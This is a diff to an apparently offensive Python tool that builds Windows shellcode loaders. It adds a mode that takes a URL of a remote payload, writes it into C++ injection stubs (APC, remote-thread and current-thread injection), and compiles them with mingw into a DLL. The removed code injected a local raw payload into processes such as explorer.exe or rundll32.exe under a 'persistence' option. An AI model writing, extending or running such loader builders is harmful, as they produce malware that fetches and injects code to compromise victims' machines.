@@ -138,7 +138,7 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
            Inject_Module = input(DAZZLINGCOLORS.OKGREEN + "Please select process injection mode:\n"+INOTGREEN)
            
            print("\n")
-           URL = input(DAZZLINGCOLORS.OKGREEN +"\n <URL of bin>:\n")
+           URL = input(DAZZLINGCOLORS.OKGREEN +"\n <URL of bin>:")
            
            outfile = "a.exe"
            try:
@@ -260,60 +260,58 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                     other_commands.Shell_Command(formatopions)
 
         if Options == "3":  # 3.持久化
-                    print(Cpp_injection_mode_options)
-                    Inject_Module = input(DAZZLINGCOLORS.OKGREEN + "Please enter process injection mode:\n" + INOTGREEN)
-                    print("\n")
-                    print(DAZZLINGCOLORS.OKGREEN + "Please select the file in raw format:\n<INETGREEN>:")
-                    filepath = ReadFilePath('bin')
-                    print(filepath)
-                    print("\n")
-                    print(DAZZLINGCOLORS.OKPINK + 
-                        "+----------+----+--------------------------+--------+\n"
-                        "|1.notepad.exe              2.explorer.exe          |\n"
-                        "|3.rundll32.exe             4.Schtasks.exe          |\n"
-                        "|5.Regsvr32.exe             6.Wmic.exe              |\n"
-                        "|7.OneDrive.exe                                     |\n"
-                        "+----------+----+--------------------------+--------+\n")
-                    inject_option = input(DAZZLINGCOLORS.OKGREEN + "\n Please select the process to inject\n"+ INOTGREEN)
-                    
-                    outfile = "%USERPROFILE%\Desktop\\"+ input(DAZZLINGCOLORS.OKGREEN + "\n output file name(*.dll)\n" + INOTGREEN)
-                    print(outfile)
-                    
-                    if inject_option == "1":
-                        inject_option = "notepad.exe"
-                    if inject_option == "2":
-                        inject_option = "explorer.exe"
-                    if inject_option == "3":
-                        inject_option = "rundll32.exe"
-                    if inject_option == "4":
-                        inject_option = "Schtasks.exe"
-                    if inject_option == "5":
-                        inject_option = "Regsvr32.exe"
-                    if inject_option == "6":
-                        inject_option = "Wmic.exe"
-                    if inject_option == "7":
-                        inject_option = "OneDrive.exe"
-                    
+           print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK)
+           print(Cpp_injection_mode_options)
+           Inject_Module = input(DAZZLINGCOLORS.OKGREEN + "Please select process injection mode:\n"+INOTGREEN)
+           
+           print("\n")
+           URL = input(DAZZLINGCOLORS.OKGREEN +"\n <URL of bin>:")
+           
+           outfile = "a.dll"
+           try:
+               if os.path.exists(outfile):
+                   os.system("""del "{0}"\n""".format(outfile))
+               
+              
+               elif Inject_Module in ["1", "QueueUserAPC", "queueUserapc"]:
+                   APC_Injection = APC_Injection.replace("URLREPLACE",URL)
+                   stub = open("Stub\\stub.cpp", "w")
+                   stub.write(APC_Injection)
+                   stub.close()
+                   #os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
+               elif Inject_Module in ["2", "RemoteThreadContext", "remotethreadcontext"]:
+                  RemoteThreadContext = RemoteThreadContext.replace("URLREPLACE",URL)
+                  stub = open("Stub\\stub.cpp", "w")
+                  stub.write(RemoteThreadContext)
+                  stub.close()
+               elif Inject_Module in ["3", "RemoteThreadSuspended", "remoteThreadsuspended"]:
+                  RemoteThreadSuspended = RemoteThreadSuspended.replace("URLREPLACE",URL)
+                  stub = open("Stub\\stub.cpp", "w")
+                  stub.write(RemoteThreadSuspended)
+                  stub.close()
+               elif Inject_Module in ["4", "CurrentThread", "currentthread"]:
+                   CurrentThread_stub = CurrentThread.replace("URLREPLACE",URL)
+                   stub = open("Stub\\stub.cpp", "w")
+                   stub.write(CurrentThread_stub)
+                   stub.close()
                    
-                        
-                    if Inject_Module in ["1", "processhollow"]:
-                        os.system(
-                            """python Stub\\Cpp_loader.py "{0}" -m processhollow -p {1} -d -o "{2}"\n""".format(filepath, inject_option,outfile))
-                    elif Inject_Module in ["2", "QueueUserAPC", "queueUserapc"]:
-                        os.system(
-                            """python Stub\\Cpp_loader.py "{0}"  -m queueUserapc -p {1} -d -o "{2}"\n""".format(filepath, inject_option,outfile))
-                    elif Inject_Module in ["3", "RemoteThreadContext", "remotethreadcontext"]:
-                        os.system(
-                            """python Stub\\Cpp_loader.py "{0}"  -m remotethreadcontext -p {1} -d -o "{2}"\n""".format(filepath, inject_option,outfile))
-                    elif Inject_Module in ["4", "RemoteThreadSuspended", "remoteThreadsuspended"]:
-                        os.system(
-                            """python Stub\\Cpp_loader.py "{0}" -p {1} -m remoteThreadsuspended -d -o "{2}"\n""".format(filepath, inject_option,outfile))
-                    elif Inject_Module in ["5", "CurrentThread", "currentthread"]:
-                        os.system(
-                            """python Stub\\Cpp_loader.py "{0}" -m currentthread -p {1} -d -o "{2}"\n""".format(filepath, inject_option,outfile))
-                    
-                    print("\n")
-                    os.system("del stub.cpp")
+               os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows -shared -o a.dll")
+               if os.path.exists("a.dll"):
+                   print(randomcolor()+"[+] Generated successfully! a.dll")
+               else:{
+                   print(randomcolor()+"[!] Generated failed! a.dll")
+               }
+               os.system("del Stub\\stub.cpp")
+               
+               
+           except:
+               continue
+    
+                
+        
+        
+        
+        
         if Options == "4":
                 print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK)
                 print(Resource.StringPainting.DynamicPainting.DynaminString())
